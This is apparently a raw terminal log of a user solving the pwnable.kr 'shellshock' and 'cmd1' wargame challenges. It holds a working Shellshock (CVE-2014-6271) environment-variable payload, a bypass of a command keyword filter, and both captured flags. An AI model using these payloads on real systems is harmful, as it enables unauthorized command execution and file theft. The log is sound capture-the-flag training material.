+/home/shellshock/bash: error importing function definition for `shock_me'
+shock_me
+shellshock@pwnable:~$ exit
+exit
+./shellshock
+shock_me
+ export shock_me='() {:;}; cat /home/shellshock/flag'
+./shellshock
+/home/shellshock/bash: shock_me: line 0: syntax error near unexpected token `{:'
+/home/shellshock/bash: shock_me: line 0: `shock_me () {:;}; cat /home/shellshock/flag'
+/home/shellshock/bash: error importing function definition for `shock_me'
+shock_me
+export shock_me='(){:;}; cat /home/shellshock/flag'
+./shellshock
+shock_me
+export shock_me='(){:;};cat /home/shellshock/flag'
+./shellshock
+shock_me
+bash
+shellshock@pwnable:~$ export shock_me='(){:;}; cat /home/shellshock/flag'
+shellshock@pwnable:~$ exit
+exit
+./shellshock
+shock_me
+export shock_me='(){:;}; cat /home/shellshock/flag'
+./shellshock
+shock_me
+export shock_me='() {:;}; cat /home/shellshock/flag'
+./shellshock
+/home/shellshock/bash: shock_me: line 0: syntax error near unexpected token `{:'
+/home/shellshock/bash: shock_me: line 0: `shock_me () {:;}; cat /home/shellshock/flag'
+/home/shellshock/bash: error importing function definition for `shock_me'
+shock_me
+export shock_me='() { :;}; cat /home/shellshock/flag'
+./shellshock
+only if I knew CVE-2014-6271 ten years ago..!!
+Segmentation fault (core dumped)
+exit
+exit
+Connection to pwnable.kr closed.
+ssh cmd1@pwnable.kr -p2222
+cmd1@pwnable.kr's password:
+env
+XDG_SESSION_ID=345955
+SHELL=/bin/bash
+TERM=xterm-256color
+SSH_CLIENT=5.28.133.65 33926 2222
+SSH_TTY=/dev/pts/62
+USER=cmd1
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+MAIL=/var/mail/cmd1
+PWD=/home/cmd1
+LANG=en_US.UTF-8
+HISTCONTROL=
+HOME=/home/cmd1
+SHLVL=1
+LOGNAME=cmd1
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+SSH_CONNECTION=5.28.133.65 33926 128.61.240.205 2222
+XDG_RUNTIME_DIR=/run/user/1025
+_=/usr/bin/env
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+ls
+cmd1  cmd1.c  flag
+cat cmd1.c
+#include <stdio.h>
+#include <string.h>
+
+int filter(char* cmd){
+	int r=0;
+	r += strstr(cmd, "flag")!=0;
+	r += strstr(cmd, "sh")!=0;
+	r += strstr(cmd, "tmp")!=0;
+	return r;
+}
+int main(int argc, char* argv[], char** envp){
+	putenv("PATH=/thankyouverymuch");
+	if(filter(argv[1])) return 0;
+	system( argv[1] );
+	return 0;
+}
+
+./cmd1
+Segmentation fault (core dumped)
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+env
+XDG_SESSION_ID=345955
+SHELL=/bin/bash
+TERM=xterm-256color
+SSH_CLIENT=5.28.133.65 33926 2222
+SSH_TTY=/dev/pts/62
+USER=cmd1
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+MAIL=/var/mail/cmd1
+PWD=/home/cmd1
+LANG=en_US.UTF-8
+HISTCONTROL=
+HOME=/home/cmd1
+SHLVL=1
+LOGNAME=cmd1
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+SSH_CONNECTION=5.28.133.65 33926 128.61.240.205 2222
+XDG_RUNTIME_DIR=/run/user/1025
+_=/usr/bin/env
+./cmd1 flagshtmp
+env
+XDG_SESSION_ID=345955
+SHELL=/bin/bash
+TERM=xterm-256color
+SSH_CLIENT=5.28.133.65 33926 2222
+SSH_TTY=/dev/pts/62
+USER=cmd1
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+MAIL=/var/mail/cmd1
+PWD=/home/cmd1
+LANG=en_US.UTF-8
+HISTCONTROL=
+HOME=/home/cmd1
+SHLVL=1
+LOGNAME=cmd1
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+SSH_CONNECTION=5.28.133.65 33926 128.61.240.205 2222
+XDG_RUNTIME_DIR=/run/user/1025
+_=/usr/bin/env
+cat /thankyouverymuch
+cat: /thankyouverymuch: No such file or directory
+./cmd1 a
+sh: 1: a: not found
+./cmd1 flag
+cat /thankyouverymuch
+cat: /thankyouverymuch: No such file or directory
+env
+XDG_SESSION_ID=345955
+SHELL=/bin/bash
+TERM=xterm-256color
+SSH_CLIENT=5.28.133.65 33926 2222
+SSH_TTY=/dev/pts/62
+USER=cmd1
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+MAIL=/var/mail/cmd1
+PWD=/home/cmd1
+LANG=en_US.UTF-8
+HISTCONTROL=
+HOME=/home/cmd1
+SHLVL=1
+LOGNAME=cmd1
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+SSH_CONNECTION=5.28.133.65 33926 128.61.240.205 2222
+XDG_RUNTIME_DIR=/run/user/1025
+_=/usr/bin/env
+./cmd1 'cat flag.txt'
+./cmd1 ls
+sh: 1: ls: not found
+./cmd1 /bin/ls
+cmd1  cmd1.c  flag
+./cmd1 /bin/cat flag
+^C
+./cmd1 /bin/cat flag
+^C^C
+^C
+./cmd1 /bin/cat\ flag
+./cmd1 /bin/cat\ flag
+./cmd1 ""/bin/cat\ flag"
+> ^C
+./cmd1 "/bin/cat\ flag"
+./cmd1 "/bin/cat\ cmd1.c"
+sh: 1: /bin/cat cmd1.c: not found
+./cmd1 "/bin/cat"
+^C
+./cmd1 /bin/cat
+cmd1.c
+cmd1.c
+^C
+./cmd1 /bin/cat
+dlg
+dlg
+flag
+flag
+^C
+./cmd1 /bin/cat
+/homne
+/homne
+^[[A^C
+./cmd1 `/bin/cat`
+ls
+s
+s
+^C
+whereis
+
+Usage:
+ whereis [options] [-BMS <dir>... -f] <name>
+
+Locate the binary, source, and manual-page files for a command.
+
+Options:
+ -b         search only for binaries
+ -B <dirs>  define binaries lookup path
+ -m         search only for manuals and infos
+ -M <dirs>  define man and info lookup path
+ -s         search only for sources
+ -S <dirs>  define sources lookup path
+ -f         terminate <dirs> argument list
+ -u         search for unusual entries
+ -l         output effective lookup paths
+
+For more details see whereis(1).
+whereami
+The program 'whereami' is currently not installed. To run 'whereami' please ask your administrator to install the package 'whereami'
+pwd
+/home/cmd1
+./cmd1 `/bin/ls /home/`
+sh: 1: aeg: not found
+./cmd1 '/bin/ls /home/'
+aeg		christmas1	combabo_calculator	fsb	       loveletter_pwn  pwnsandbox_pwn  tiny_easy_pwn
+alloca		christmas2	combabo_calculator_pwn	fsb_pwn        malware	       random	       tiny_hard
+alloca_pwn	christmas2_pwn	crcgen			horcruxes      maze	       random_pwn      tiny_hard_pwn
+ascii		christmas3	crcgen_pwn		horcruxes_pwn  md5calculator   rootkit	       tiny_pwn
+ascii_easy	christmas3_pwn	crypto1			hunter	       memcpy	       rsa_calculator  towelroot
+ascii_easy_pwn	cmd1		dos			hunter_pwn     memcpy_pwn      shellshock      uaf
+ascii_pwn	cmd1_pwn	dos_pwn			input2	       mipstake        shellshock_pwn  uaf_pwn
+asg		cmd2		dragon			input2_pwn     mipstake_pwn    simplelogin     unexploitable
+asg_pwn		cmd2_pwn	echo1			kcrc	       mistake	       softmmu	       unexploitable_pwn
+asm		cmd3		echo2			leg	       note	       sslab	       unlink
+asm3		cmd3_pwn	elf			lfh	       note_pwn        starcraft       unlink_pwn
+asm_pwn		codemap		elf_pwn			lfh_pwn        nuclear	       starcraft_pwn   wtf
+blackjack	codemap_pwn	exploitable		lokihardt      otp	       sudoku
+blukat		coin1		exploitable_pwn		lokihardt_pwn  otp_pwn	       syscall
+blukat_pwn	coin2		exynos			lotto	       passcode        test
+bof		col		fd			lotto_pwn      passcode_pwn    tiny
+brainfuck	col_pwn		fix			loveletter     pwnsandbox      tiny_easy
+./cmd1 '/bin/cat /home/cmd1'
+/bin/cat: /home/cmd1: Is a directory
+./cmd1 '/bin/cat /home/cmd1/cmd1.c'
+#include <stdio.h>
+#include <string.h>
+
+int filter(char* cmd){
+	int r=0;
+	r += strstr(cmd, "flag")!=0;
+	r += strstr(cmd, "sh")!=0;
+	r += strstr(cmd, "tmp")!=0;
+	return r;
+}
+int main(int argc, char* argv[], char** envp){
+	putenv("PATH=/thankyouverymuch");
+	if(filter(argv[1])) return 0;
+	system( argv[1] );
+	return 0;
+}
+
+./cmd1 '/bin/cat /home/cmd1/flag'
+export pathy=/home/cmd1/flag
+cat $pathy
+cat: /home/cmd1/flag: Permission denied
+./cmd1 '/bin/cat $pathy'
+mommy now I get what PATH environment is for :)
+exit
+exit
+Connection to pwnable.kr closed
